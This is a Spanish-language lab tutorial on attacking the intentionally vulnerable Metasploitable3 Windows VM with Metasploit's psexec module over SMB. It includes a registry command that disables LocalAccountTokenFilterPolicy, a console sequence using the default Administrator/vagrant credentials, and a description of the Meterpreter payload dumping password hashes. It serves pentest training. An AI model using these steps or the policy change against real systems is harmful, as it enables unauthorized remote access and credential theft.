## Vulnerabilidades Metasploitable3
Metasploitable3 es una máquina virtual que contiene desde su creación vulnerabilidades a propósito, con el fin de que sirva como un campo de pruebas para aquellos que quieran hacer pentesting, es decir, probar a explotar la máquina mediante uno de estos vectores.

Metasploitable3 viene con dos máquina virtuales, Windows Server 2008 y Ubuntu 14.04 (sin GUI).

### psexec
Psexec es una herramienta de Windows que sirve de reemplazo ligero a telnet, permitiendo ejecutar procesos en otros sistemas, completando la interactividad completa para las aplicaciones de consola sin tener que instalar manualmente el software cliente.

Sin embargo, en nuestro Windows Server 2008, esta herramienta contiene un agujero de seguridad. Metasploit (una librería de scripts diseñados para pentesting) tiene un módulo llamado `exploit/windows/smb/psexec` que permite explotarlo de forma remota si se conoce la contraseña de un usuario. Por otro lado, el exploit funciona a través de SMB, por lo que el servicio y su puerto correspondiente (445) deben estar activados.

Cabe aclarar que, para que el módulo funcione, Windows Server 2008 debe tener una política concreta de seguridad desactivada, la cual es `LocalAccountTokenFilterPolicy`. De forma simplificada, esta política es un filtro que previene que se usen privilegios elevados a través de la red. Para desactivarla, se puede ejecutar este comando a través de una CMD:

```
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

Los pasos para realizar el exploit son los siguentes:

```
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.1.129
RHOST => 192.168.1.129
msf exploit(psexec) > set SMBUser Administrator
SMBUser => Administrator
msf exploit(psexec) > set SMBPass vagrant
SMBPass => vagrant
msf exploit(psexec) > exploit
```

El proceso es el siguiente: Abrimos la terminal de metasploit, y seleccionamos `exploit/windows/smb/psexec` mediante el comando `use`. Posteriormente le decimos al programa a qué IP queremos mandar el ataque, en nuestro caso a la `192.168.1.129`. Posteriormente se le indica el usuario y la contraseña que queremos utilizar para el ataque (Administrator y vagrant), y por últmo ejecutamos el exploit mediante el comando igualmente llamado `exploit`.

Por defecto, la payload (el código malicioso que se ejecuta en el dispositivo al que queremos acceder) se tratará de Meterpreter, un programa muy potente que permite gran control sobre el sistema operativo, que nos permitirá explorar, modificar, borrar archivos, extraer usuarios y contraseñas hash, etc.